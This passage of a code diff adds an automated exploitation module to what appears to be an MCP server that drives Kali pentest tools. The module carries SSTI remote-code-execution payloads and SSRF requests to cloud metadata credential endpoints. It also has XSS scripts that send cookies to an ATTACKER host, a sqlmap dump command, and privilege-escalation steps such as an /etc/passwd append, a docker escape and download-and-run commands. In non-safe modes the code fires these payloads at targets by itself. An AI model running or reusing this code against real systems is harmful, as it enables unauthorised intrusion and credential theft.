+                            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+                            "{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}",
+                            "{{''.__class__.mro()[1].__subclasses__()[408]('whoami',shell=True,stdout=-1).communicate()}}",
+                        ],
+                    })
+                elif engine == "twig":
+                    web_exploits.append({
+                        "type": "ssti_rce", "engine": "twig",
+                        "payloads": [
+                            "{{['id']|filter('system')}}",
+                            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+                        ],
+                    })
+
+            # SSRF → Cloud metadata
+            ssrf_findings = pentest_memory.get_findings(target, "ssrf") or []
+            if ssrf_findings:
+                web_exploits.append({
+                    "type": "ssrf_chain",
+                    "description": "SSRF → Cloud Metadata → Credential Extraction",
+                    "payloads": {
+                        "aws": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                        "gcp": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+                        "azure": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
+                    },
+                })
+
+            # XSS → Session hijack
+            xss_findings = pentest_memory.get_findings(target, "xss_stored") or []
+            if xss_findings:
+                web_exploits.append({
+                    "type": "xss_session_hijack",
+                    "description": "Stored XSS → Session Hijacking",
+                    "payloads": [
+                        "<script>new Image().src='http://ATTACKER/steal?c='+document.cookie</script>",
+                        "<script>fetch('http://ATTACKER/steal',{method:'POST',body:document.cookie})</script>",
+                    ],
+                })
+
+            web_results["exploits"] = web_exploits
+
+            # Execute web exploits in moderate/aggressive mode
+            if strategy != "safe" and web_exploits:
+                for exploit in web_exploits[:3]:
+                    if exploit["type"] in ("lfi_to_rce", "ssti_rce"):
+                        payloads = exploit.get("payloads", exploit.get("steps", []))
+                        if isinstance(payloads, list) and payloads:
+                            try:
+                                test_payload = payloads[0]
+                                if exploit["type"] == "ssti_rce":
+                                    test_url = f"http://{target}/?input={test_payload}"
+                                else:
+                                    test_url = test_payload if test_payload.startswith("curl") else f"curl '{test_payload}'"
+                                proc = await asyncio.create_subprocess_shell(
+                                    f"timeout 15 curl -sk '{test_url}' 2>&1 | head -50",
+                                    stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+                                stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=20)
+                                output = stdout.decode(errors="replace")[:2000]
+                                exploit["test_result"] = output
+                                if "uid=" in output or "root" in output:
+                                    results["shells_obtained"] += 1
+                                    results["exploits_succeeded"] += 1
+                            except Exception as e:
+                                exploit["test_error"] = str(e)
+                            results["exploits_attempted"] += 1
+
+            results["modules"]["web_exploit"] = web_results
+
+        # ── Custom Exploit Chain ──
+        if "custom_chain" in active:
+            chain = {"attack_path": [], "phase": "planning"}
+
+            # Build attack path from all intelligence
+            if vulns_found:
+                # Sort vulnerabilities by severity/exploitability
+                chain["attack_path"].append({
+                    "phase": 1, "action": "initial_access",
+                    "method": "Most promising entry point",
+                    "vulns_available": len(vulns_found),
+                    "tech_context": tech_stack,
+                })
+
+                if pentest_memory.has_finding(target, "credentials") or pentest_memory.has_finding(target, "default_creds"):
+                    chain["attack_path"].append({
+                        "phase": 2, "action": "credential_access",
+                        "method": "Use cracked/default credentials for authenticated exploitation",
+                    })
+
+                if pentest_memory.has_finding(target, "sqli_found"):
+                    chain["attack_path"].append({
+                        "phase": 2, "action": "data_exfiltration",
+                        "method": "SQLi → database dump → credential extraction",
+                        "command": f"sqlmap -u 'http://{target}/' --forms --batch --dump --threads=5",
+                    })
+
+                if pentest_memory.has_finding(target, "ssrf"):
+                    chain["attack_path"].append({
+                        "phase": 3, "action": "lateral_movement",
+                        "method": "SSRF → internal service access → pivot to cloud/internal",
+                    })
+
+                chain["attack_path"].append({
+                    "phase": 4, "action": "post_exploitation",
+                    "method": "Persistence + privilege escalation + data collection",
+                    "tools": ["post_exploit_ops", "payload_factory"],
+                })
+
+            results["modules"]["custom_chain"] = chain
+
+        # ── Privilege Escalation Suggestions ──
+        if "privesc_suggest" in active:
+            privesc = {"linux": [], "windows": [], "tools": []}
+
+            os_hint = tech_stack.get("os", "").lower()
+
+            if not os_hint or "linux" in os_hint:
+                privesc["linux"] = [
+                    {"method": "SUID binaries", "command": "find / -perm -4000 -type f 2>/dev/null",
+                     "reference": "https://gtfobins.github.io/"},
+                    {"method": "Kernel exploit", "command": "uname -a && cat /etc/os-release",
+                     "tool": "linux-exploit-suggester.sh"},
+                    {"method": "Sudo misconfiguration", "command": "sudo -l",
+                     "reference": "https://gtfobins.github.io/"},
+                    {"method": "Writable /etc/passwd", "command": "ls -la /etc/passwd /etc/shadow",
+                     "exploit": "openssl passwd -1 -salt xyz password123 >> /etc/passwd"},
+                    {"method": "Cron jobs", "command": "cat /etc/crontab; ls -la /etc/cron.*",
+                     "tool": "pspy"},
+                    {"method": "Docker escape", "command": "id; groups; ls -la /var/run/docker.sock",
+                     "exploit": "docker run -v /:/host -it alpine chroot /host"},
+                    {"method": "Capabilities", "command": "getcap -r / 2>/dev/null",
+                     "reference": "https://gtfobins.github.io/"},
+                    {"method": "LinPEAS", "command": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+                     "tool": "linpeas.sh"},
+                ]
+
+            if not os_hint or "windows" in os_hint:
+                privesc["windows"] = [
+                    {"method": "Token impersonation", "tool": "PrintSpoofer / GodPotato / JuicyPotato",
+                     "command": "PrintSpoofer64.exe -i -c cmd"},
+                    {"method": "Unquoted service paths",
+                     "command": "wmic service get name,displayname,pathname,startmode | findstr /i auto | findstr /i /v \"C:\\Windows\""},
+                    {"method": "AlwaysInstallElevated",
+                     "command": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"},
+                    {"method": "Stored credentials",
+                     "command": "cmdkey /list && dir C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials\\*"},
+                    {"method": "WinPEAS",
+                     "command": "certutil -urlcache -split -f https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe winpeas.exe && winpeas.exe"},
+                    {"method": "PowerUp", "tool": "PowerSploit",
+                     "command": "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/PowerUp.ps1'); Invoke-AllChecks\""},
+                ]
+
+            privesc["tools"] = [
+                {"name": "LinPEAS/WinPEAS", "url": "https://github.com/carlospolop/PEASS-ng"},
+                {"name": "linux-exploit-suggester", "url": "https://github.com/mzet-/linux-exploit-suggester"},
+                {"name": "GTFOBins", "url": "https://gtfobins.github.io/"},
+                {"name": "LOLBAS", "url": "https://lolbas-project.github.io/"},
+                {"name": "pspy", "url": "https://github.com/DominicBreuker/pspy"},
+            ]
+
+            results["modules"]["privesc_suggest"] = privesc
+
+        # ── Summary ──
+        results["summary"] = {
+            "total_exploits_attempted": results["exploits_attempted"],
+            "total_exploits_succeeded": results["exploits_succeeded"],
+            "shells_obtained": results["shells_obtained"],
+            "credentials_found": results["credentials_found"],
+            "success_rate": f"{results['exploits_succeeded']/max(results['exploits_attempted'],1)*100:.0f}%",
+            "strategy_used": strategy,
+            "recommendation": (
+                "Exploitation paths identified. Review and execute manually for full control."
+                if strategy == "safe" else
+                f"Automated exploitation complete. {results['exploits_succeeded']} successful out of {results['exploits_attempted']} attempts."
+            ),
+        }
+
+        # Store in memory and advance kill chain
+        if results["exploits_succeeded"] > 0:
+            pentest_memory.store_finding(target, "auto_exploit", "exploitation_success", {
+                "succeeded": results["exploits_succeeded"],
+                "shells": results["shells_obtained"],
+                "creds": results["credentials_found"],
+            })
+            kill_chain.advance_phase(target, KillChainPhase.EXPLOITATION, "auto_exploit",
+                                     [f"succeeded:{results['exploits_succeeded']}",
+                                      f"shells:{results['shells_obtained']}"])
+        else:
+            pentest_memory.store_finding(target, "auto_exploit", "exploitation_plan", {
+                "attempted": results["exploits_attempted"],
+                "modules_used": active,
+            })
+            if results["exploits_attempted"] > 0:
+                kill_chain.advance_phase(target, KillChainPhase.WEAPONIZATION, "auto_exploit",
+                                         [f"planned:{results['exploits_attempted']}"])
+
+        session_manager.complete_execution(execution, results)
+        return json.dumps(results, indent=2, default=str)
+
+    except Exception as e:
+        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
+        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})
+
+
+# ============================================================================
 # SERVER STARTUP
 # ============================================================================
 
 if __name__ == "__main__":
     logger.info("Starting Kali MCP Server v6.2 - Autonomous Pentest Engine")
-    logger.info("Architecture: 24 unified mega-modules + Protocol Intelligence Layer")
+    logger.info("Architecture: 26 unified mega-modules + Protocol Intelligence Layer")
     mcp.run(transport="stdio")
